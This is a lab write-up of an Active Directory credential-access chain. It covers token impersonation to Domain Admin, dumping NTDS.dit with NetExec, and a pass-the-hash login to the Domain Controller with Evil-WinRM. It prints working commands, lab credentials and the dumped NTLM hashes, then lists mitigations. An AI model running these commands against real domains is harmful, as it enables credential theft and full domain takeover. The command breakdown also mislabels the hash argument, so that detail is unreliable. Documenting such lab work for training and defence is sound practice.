# ntds dumping

**Date:** June 2026  
**Author:** ShahinSecLab  
**Category:** Credential Access  
**Difficulty:** Easy  
**Tools:** NetExec, Evil-winrm

## Table of Contents

- [Overview](#ntds-dumping)
- [What I Understood During the Process](#what-i-understood-during-the-process)
- [Why This Step Was Important in the Lab](#why-this-step-was-important-in-the-lab)
- [Step 1 — Token Impersonation & Privilege Escalation](#step---1-token-impersonation-and-privilege-escallation)
- [Step 2 — NTDS Dump with NetExec](#step---2-ntds-dump--netexec)
- [Step 3 — Getting a Shell with Evil-WinRM](#step---3-getting-a-shell-with-evil-winrm)
- [What I Achieved](#what-i-achieved)
- [Mitigations](#mitigations)
- [Key Takeaways](#key-takeaways)
- [References](#references)


## NTDS Dumping 

From an attacker perspective during this Active Directory lab, NTDS dumping was one of the most important and high-impact stages of the entire attack chain.

After gaining access to a system with elevated privileges on the Domain Controller, I focused on extracting the Active Directory database file (NTDS.dit). This file is critical because it contains the core authentication data of the entire domain.

Instead of targeting a single user or machine, I shifted focus toward the full domain credential database.

## What I Understood During the Process

While working on this technique, I realized that:

- NTDS.dit is the main database of Active Directory
- It stores all user accounts in the domain
- It contains password hashes (not plain passwords)
- These hashes can represent both normal users and privileged accounts

This made it clear that compromising this file is equivalent to gaining deep visibility into the entire domain environment.

## Why This Step Was Important in the Lab

In the attack flow, NTDS dumping represented the final and most powerful stage of credential access. Earlier steps helped to move deeper into the system, but this step provided:

- A complete list of domain user credentials (in hash form)
- Potential access to high-privilege accounts
- A way to extend control across the network

# Steps

## Step - 1 Token Impersonation & Privilege Escalation

Before performing the NTDS dump, I first carried out a Token Impersonation attack to escalate my privileges within the domain.

During this phase, the test user account was added to the Domain Admins group. After successfully impersonating a privileged token, I gained administrative privileges and took control of the test account.

I then used the credentials of this Domain Admin account to authenticate and continue with the NTDS dumping process as part of the post-exploitation phase.

### Credentials:

- user name: `test`
- password: `@shahin123#!`

## Step - 2 NTDS Dump — NetExec

After obtaining Domain Admin privileges through Token Impersonation, I used the test account to dump the Active Directory database from the Domain Controller.

```bash
nxc smb 192.168.5.134 -u test -p '@shahin123#!' --ntds
```

## Command Breakdown

```
|         Part        |                        Description                                                              |
|---------------------|-------------------------------------------------------------------------------------------------|
| `nxc`               | NetExec — a network penetration testing tool (successor to CrackMapExec)                        |
| `smb`               | Protocol being used — Server Message Block (SMB)                                                |
| `192.168.5.134`     | IP address of the target Domain Controller                                                      |
| `-u test`           | Username used for authentication                                                                |
| `-p '@shahin123#!'` | Password for the specified user                                                                 |
| `--ntds`            | Attempts to extract the NTDS.dit database, which contains Active Directory user password hashes |
```

When I executed the command, NetExec authenticated to the Domain Controller over SMB using the Domain Admin credentials and successfully dumped the contents of the NTDS.dit database.

The dump contained NTLM password hashes for domain users, built-in accounts, and computer accounts. These hashes can be used during post-exploitation for activities such as:

- Pass-the-Hash attacks using NTLM hashes.
- Offline password cracking with tools such as Hashcat.
- Extracting additional credential material for further assessment, depending on the environment and account configuration.

**Output:**

```
SMB         192.168.5.134   445    REDTEAMBD-DC     [*] Windows Server 2022 Build 20348 x64 (name:REDTEAMBD-DC) (domain:READTEAMBD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.5.134   445    REDTEAMBD-DC     [+] READTEAMBD.local\test:@shahin123#! (Pwn3d!)
SMB         192.168.5.134   445    REDTEAMBD-DC     [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.5.134   445    REDTEAMBD-DC     Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
SMB         192.168.5.134   445    REDTEAMBD-DC     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.134   445    REDTEAMBD-DC     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f8156b8f557baae7cd069ac724e1959:::
SMB         192.168.5.134   445    REDTEAMBD-DC     READTEAMBD.local\shahin:1105:aad3b435b51404eeaad3b435b51404ee:bcb3cd5313f9537196a11fdb9fad2ac9:::
SMB         192.168.5.134   445    REDTEAMBD-DC     READTEAMBD.local\sqlservice:1106:aad3b435b51404eeaad3b435b51404ee:7e449687caaf71367ad41ad9490f926d:::
SMB         192.168.5.134   445    REDTEAMBD-DC     READTEAMBD.local\rahimkhan:1109:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.134   445    REDTEAMBD-DC     READTEAMBD.local\karimkhan:1110:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.134   445    REDTEAMBD-DC     test2:1115:aad3b435b51404eeaad3b435b51404ee:26f6b62914c0b90561b76abc3121382d:::
SMB         192.168.5.134   445    REDTEAMBD-DC     test:1117:aad3b435b51404eeaad3b435b51404ee:26f6b62914c0b90561b76abc3121382d:::
SMB         192.168.5.134   445    REDTEAMBD-DC     REDTEAMBD-DC$:1000:aad3b435b51404eeaad3b435b51404ee:5d61398d1bb36494251624d87522d005:::
SMB         192.168.5.134   445    REDTEAMBD-DC     VICTIM-1$:1111:aad3b435b51404eeaad3b435b51404ee:af96b7d9f1e7c7d5a983c634b7db3a92:::
SMB         192.168.5.134   445    REDTEAMBD-DC     VICTIM-2$:1112:aad3b435b51404eeaad3b435b51404ee:4286814f1a9fcc086127d115a63621c7:::
SMB         192.168.5.134   445    REDTEAMBD-DC     [+] Dumped 12 NTDS hashes to /root/.nxc/logs/ntds/REDTEAMBD-DC_192.168.5.134_2026-06-06_011030.ntds of which 9 were added to the database
SMB         192.168.5.134   445    REDTEAMBD-DC     [*] To extract only enabled accounts from the output file, run the following command: 
SMB         192.168.5.134   445    REDTEAMBD-DC     [*] grep -iv disabled /root/.nxc/logs/ntds/REDTEAMBD-DC_192.168.5.134_2026-06-06_011030.ntds | cut -d ':' -f1
```
The command completed successfully and extracted the NTLM hashes from the Domain Controller, providing the credential material required for the next phase of the assessment.

<p align="center">
  <img src="/writeups/ntds dump/images/step2.png" width="600">
</p>

# Step - 3 Getting a Shell with Evil-WinRM

After dumping the NTDS.dit and getting the Administrator hash, I used
Evil-WinRM to log into the Domain Controller directly using the hash —
no password needed.

```bash
evil-winrm -i 192.168.5.134 -u 'administrator' -H 'fc525c9683e8fe067095ba2ddc971889'
```

## Command Breakdown

- `evil-winrm` - A tool used to remotely access Windows machines via the WinRM (Windows Remote Management) protocol.
- `-i 192.168.5.134`- IP address of the target machine.
- `-u administrator`- Username used for authentication.
- `-H 'jlkahflahfklasklfashl'`- Last portion of administrator NTLM hash.

This is a Pass the Hash attack. Instead of using the actual password, I used the NTLM hash I dumped earlier from NTDS.dit to log straight into the Domain Controller as Administrator — no cracking needed.
Once the command runs successfully, I get a full interactive shell on the Domain Controller.

**Output:**

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
readteambd\administrator
```
### Result

```
|      Field        |                 Value                          |
|-------------------|------------------------------------------------|
| **Target IP**     | `192.168.5.134`                                |
| **User**          | `administrator`                                |
| **Hash Used**     | `fc525c9683e8fe067095ba2ddc971889`             |
| **Shell**         | Got a full PowerShell session as Administrator |
| **Whoami Output** | `readteambd\administrator`                     |
```
I successfully logged in as **Domain Administrator** without ever knowing the real password — just the hash was enough to own the box.

<p align="center">
  <img src="/writeups/ntds dump/images/step3.png" width="600">
</p>

## What I Achieved

By reaching this stage, I demonstrated that:

- I had control over a Domain Controller-level environment
- I could extract sensitive authentication data from Active Directory
- I could use this data for further analysis and lateral movement in a real scenario

## Mitigations

- Protect NTDS.dit at the File Level
- Control Who Can Reach the Domain Controller
- Stop Pass the Hash
- Harden WinRM and Remote Access
- Detect the Dump Before It Completes
- Make Stolen Hashes Useless
- Audit Privileged Group Membership


## Key Takeaways

| # | Takeaway |
|---|----------|
| 1 | NTDS.dit is not just a file — it is a copy of every credential in the domain. Treating it like a normal system file is a mistake. |
| 2 | A Domain Admin account is all an attacker needs to dump the entire database. The access control problem comes before the dump, not during. |
| 3 | Pass the Hash is what makes this attack so fast and damaging — cracking is optional when you can just use the hash directly. |
| 4 | NetExec and similar tools are loud if you are watching — they hit SMB, trigger VSS, and write to disk. The signals are there. |
| 5 | The `krbtgt` hash is inside NTDS.dit — a successful dump also enables Golden Ticket attacks, so the response scope is always larger than just resetting user passwords. |
| 6 | WinRM is the door Evil-WinRM walks through. If it is open to the whole network, assume it will be used the moment someone has a valid hash. |
| 7 | Group membership changes that are not alerted on are invisible. A test account sitting in Domain Admins is just as dangerous as a real admin account. |

## References

### Microsoft Official Docs

- [Securing Active Directory — Microsoft Docs](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)
- [Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [Local Administrator Password Solution (LAPS)](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)
- [Privileged Identity Management (PIM)](https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-configure)
- [Windows Security Auditing Event Reference](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing-overview)

### MITRE ATT&CK

- [T1003.003 — OS Credential Dumping: NTDS](https://attack.mitre.org/techniques/T1003/003/)
- [T1550.002 — Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
- [T1078.002 — Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)
- [T1021.006 — Remote Services: Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/)

### Tools Referenced in the Writeup

- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

### Further Reading

- [Sean Metcalf — Extracting Password Hashes from the Ntds.dit File (ADSecurity.org)](https://adsecurity.org/?p=2398)
- [SANS — Protecting Active Directory from Known Attacks](https://www.sans.org/blog/protecting-active-directory-from-known-attacks/)
- [Microsoft — Detecting and Mitigating Pass the Hash](https://www.microsoft.com/en-us/download/details.aspx?id=36036)
